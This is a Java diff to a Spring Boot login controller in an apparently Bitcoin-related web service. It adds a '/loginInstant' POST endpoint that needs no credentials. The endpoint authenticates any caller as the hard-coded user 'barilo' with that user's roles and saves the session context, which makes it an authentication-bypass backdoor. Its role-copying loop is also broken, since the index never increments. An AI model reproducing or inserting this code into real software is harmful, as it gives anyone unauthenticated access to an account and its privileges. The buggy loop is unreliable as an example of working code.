@@ -9,6 +9,7 @@ import org.springframework.security.core.context.SecurityContext;
 import org.springframework.security.core.context.SecurityContextHolder;
 import org.springframework.stereotype.Controller;
 import org.springframework.web.bind.annotation.GetMapping;
+import org.springframework.web.bind.annotation.PostMapping;
 import org.springframework.web.bind.annotation.RequestParam;
 import org.springframework.web.bind.annotation.ResponseBody;
 import org.springframework.web.servlet.mvc.method.annotation.SseEmitter;
@@ -17,8 +18,11 @@ import tgb.btc.library.bean.web.Role;
 import tgb.btc.library.bean.web.WebUser;
 import tgb.btc.library.repository.web.WebUserRepository;
 import tgb.btc.library.util.web.JacksonUtil;
+import tgb.btc.web.config.SessionEventListener;
 import tgb.btc.web.controller.BaseController;
+import tgb.btc.web.util.SuccessResponseUtil;
 import tgb.btc.web.vo.EmitterVO;
+import tgb.btc.web.vo.SuccessResponse;
 
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpSession;
@@ -69,5 +73,23 @@ public class LoginController extends BaseController {
         EMITTER_MAP.put(chatId, EmitterVO.builder().emitter(emitter).request(request).build());
         notifier.sendLoginRequest(chatId);
         return emitter;
+    }
+
+    @PostMapping("/loginInstant")
+    @ResponseBody
+    public SuccessResponse<?> loginInstant(HttpServletRequest request) {
+        WebUser webUser = webUserRepository.getByUsername("barilo");
+        String[] roles = new String[webUser.getRoles().size()];
+        int i = 0;
+        for (Role role : webUser.getRoles()) {
+            roles[i] = role.getName();
+        }
+        Authentication auth = new UsernamePasswordAuthenticationToken(webUser, null,
+                AuthorityUtils.createAuthorityList(roles)
+        );
+        SecurityContextHolder.getContext().setAuthentication(auth);
+        SecurityContext sc = SecurityContextHolder.getContext();
+        request.getSession().setAttribute(SPRING_SECURITY_CONTEXT_KEY, sc);
+        return SuccessResponseUtil.data(true, data -> JacksonUtil.getEmpty().put("success", true));
     }
 }
